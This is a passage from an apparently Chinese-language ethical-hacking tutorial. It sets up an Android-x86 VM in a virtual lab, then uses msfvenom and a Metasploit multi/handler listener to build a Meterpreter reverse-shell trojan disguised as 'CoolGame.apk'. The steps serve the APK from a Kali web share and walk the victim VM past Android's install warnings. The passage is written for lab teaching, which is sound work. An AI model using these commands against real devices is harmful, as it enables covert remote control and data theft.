    # 添加 Android 虚拟机


    我们想以安全、合乎道德的方式入侵一台 Android 移动设备，因此我们将首先在虚拟黑客实验室中添加一个 Android VM。按照以下步骤下载并配置 VM。


    1. 访问 [`www.osboxes.org/android-x86/`](https://www.osboxes.org/android-x86/) 并向下滚动到
    Android-x86 8.1-RC1 Oreo 部分。选择 `VirtualBox` 选项卡，然后单击 64 位版本的 `Download` 按钮。


    2. 你的下载文件应具有 `*.7z` 扩展名。要解压缩文件，你需要下载并安装适用于 Windows 的 7-Zip、适用于 Mac 的 Archiver
    或适用于 Linux 的 p7zip-full。安装所需软件后，解压缩 Android VM：在 Windows 上，右键单击文件并选择 `7-Zip`▶`Extract
    Here`；在 macOS 或 Linux 上，双击文件。VM 将被解压缩到名为 `64bit` 的文件夹中。


    3. 打开 VirtualBox 并单击 `New` 打开创建虚拟机窗口。


    4. 在名称和操作系统对话框中，在名称：文本框中输入 `Android 8.1` 或类似名称，从类型：下拉列表中选择 `Linux`，并从版本：下拉列表中选择
    `Other Linux (64-bit)`。然后在 Windows 上单击 `Next` 或在 macOS 上单击 `Continue`。


    5. 在内存大小对话框中，在框中输入 `2048` 为 VM 提供 2,048MB（2GB）内存，然后单击继续到下一屏幕。


    6. 在硬盘对话框中，选择 `Use an existing virtual hard disk file` 并单击浏览图标（带有绿色箭头的文件夹）。在弹出的窗口中，单击
    `Add`。然后在你解压缩的 `64bit` 文件夹中查找并选择 `*.vdi` 文件。


    7. 单击返回到硬盘对话框并选择 `Create` 以创建 VM。你的新 Android 8.1 VM 现在应该出现在 VirtualBox 的 VM 列表中，如
    图 9-1 所示。


    8. 在列表中选择 Android VM，转到 `Settings`，并选择 `Display` 选项卡。在图形控制器：下拉列表中，选择 `VBoxSVGA`。这将更改显示设置，以便我们能够看到
    Android 智能手机 VM 的图形用户界面 (GUI) 版本。


    9. 仍在 Display 选项卡中，确保 `Enable 3D Acceleration` 旁边的复选框未被选中。（不过，如果你的 VM 过一段时间无法工作，你可能需要打开
    3D 加速。）


    10. 切换到 `Network` 设置选项卡并选择名为 `PublicNAT` 的 NAT 网络。这将使你的 Android VM 能够与你虚拟黑客实验室中的
    Kali VM 通信。


    ![Figure 9-1: We’ve added an Android 8.1 VM to VirtualBox!](img/f09001.png)


    图 9-1：我们已将 Android 8.1 VM 添加到 VirtualBox！


    你现在可以启动 Android VM 了！首次加载可能需要几分钟（如果屏幕黑屏超过一分钟左右，你可能需要重启 VM），但你最终会看到类似 图 9-2 所示的
    Android 设备主屏幕。


    ![Figure 9-2: The home screen on your virtual Android device](img/f09002.png)


    图 9-2：你虚拟 Android 设备上的主屏幕


    在开始探索 VM 之前，请在 Android VM 的菜单栏中转到 `Input`▶`Mouse Integration` 以取消选择鼠标集成。保持鼠标集成开启会使控制
    Android VM 上的指针变得困难。（Android VM 是为触摸屏设计的，因此在 Android 中使用鼠标本身就令人沮丧。）完成此操作后，你就可以开始探索你的虚拟
    Android 设备了。


    打开 Chrome 浏览器并浏览网页，或打开联系人应用并添加一些联系人——随意尝试你想做的任何事情。Android VM 与真实的 Android 平板电脑或手机几乎完全相同，只是它无法拨打电话，也没有某些传感器（例如用于位置服务的
    GPS）。请记住，当你想要退出 Android VM 时，可以使用右 CTRL 键（Windows）或左 COMMAND 键（Mac）来重新控制鼠标，就像我们对其他
    VM 所做的那样。


    # 启动 Android 木马


    现在我们准备创建一些恶意软件。就像我们在第 6 章中对 Windows VM 所做的那样，我们将使用 Meterpreter 木马来感染并控制 Android
    VM。我们将木马隐藏在名为 `CoolGame.apk` 的文件中。Android 使用 `APK file format` 来分发和安装移动应用。按照以下步骤，你将看到攻击者诱骗
    Android 用户安装并运行受感染应用是多么容易。


    1. 登录到你的 Kali VM 并启动 Metasploit。


    2. 在 Metasploit `msf6` 命令提示符下，输入以下命令作为一行长命令，将你的 Kali VM 的 IP 地址替换到 `LHOST=` 之后：


    ```

    msf6 > sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.9.4 -f raw
    -o /var/www/html/share/CoolGame.apk

    ```


    这将创建一个 `android/meterpreter/reverse_tcp` 有效载荷，形式为 APK 文件，并将其直接保存到 Kali 的共享 Web
    文件夹中。Metasploit 将输出几行内容，最后类似于以下内容：


    ```

    --snip--

    Payload size: 10080 bytes

    Saved as: /var/www/html/share/CoolGame.apk

    ```


    3. 打开 Apache Web 服务器服务，以便你可以从 Android VM 下载该文件：


    ```

    msf6 > sudo service apache2 start

    ```


    4. 要验证你的 Kali Web 服务器是否处于活动状态，请打开 Firefox 并访问 `localhost/share`。你应该在文件列表中看到 `CoolGame.apk`。


    5. 在 Metasploit 终端窗口中输入以下四个命令，以设置处理传入 Meterpreter 连接的监听器：


    ```

    msf6 > use exploit/multi/handler

    msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp PAYLOAD
    => android/meterpreter/reverse_tcp

    msf6 exploit(multi/handler) > set LHOST 10.0.9.4

    LHOST => 10.0.9.4

    msf6 exploit(multi/handler) > exploit

    ```


    Metasploit 现在正在监听传入连接！


    # 感染 Android 虚拟机


    现在我们将下载木马应用并故意感染你的虚拟 Android 设备。切换回你的 Android VM 并按照以下步骤操作：


    1. 打开 Chrome 浏览器，在地址栏中输入你的 Kali VM 的 IP 地址，后跟 `/share/`，例如 `10.0.9.4/share/`，如
    图 9-3 所示。


    ![Figure 9-3: Navigate to your Kali VM’s share folder from your Android VM’s Chrome
    browser to find your CoolGame.apk trojan app ready to download and install.](img/f09003.png)


    图 9-3：从 Android VM 的 Chrome 浏览器导航到 Kali VM 的 `share` 文件夹，找到准备下载和安装的 `CoolGame.apk`
    木马应用。


    2. 单击 APK 文件以下载它。当你首次尝试下载文件时，Android 会弹出一条消息，要求你授予 Chrome 访问设备文件存储的权限。单击 `Update
    Permissions`，然后单击 `Allow`。


    ![](img/g09001.png)


    3. 再次单击 APK 文件以下载它。Chrome 通常会显示警告“此类文件可能会损坏你的设备”。单击 `OK` 仍然下载该文件。


    4. 单击 Android VM 屏幕左上角的向下箭头，你将看到如 图 9-5 所示的下载管理器。单击列表中 APK 文件的名称以安装该应用。


    5. Android 会再次弹出一个窗口，告诉你“你的手机不允许从此来源安装未知应用”。单击 `Settings`，然后滑动切换开关以打开 `Allow from
    this source` 设置。


    ![Figure 9-5: Accessing the Download Manager](img/f09005.png)


    图 9-5：访问下载管理器


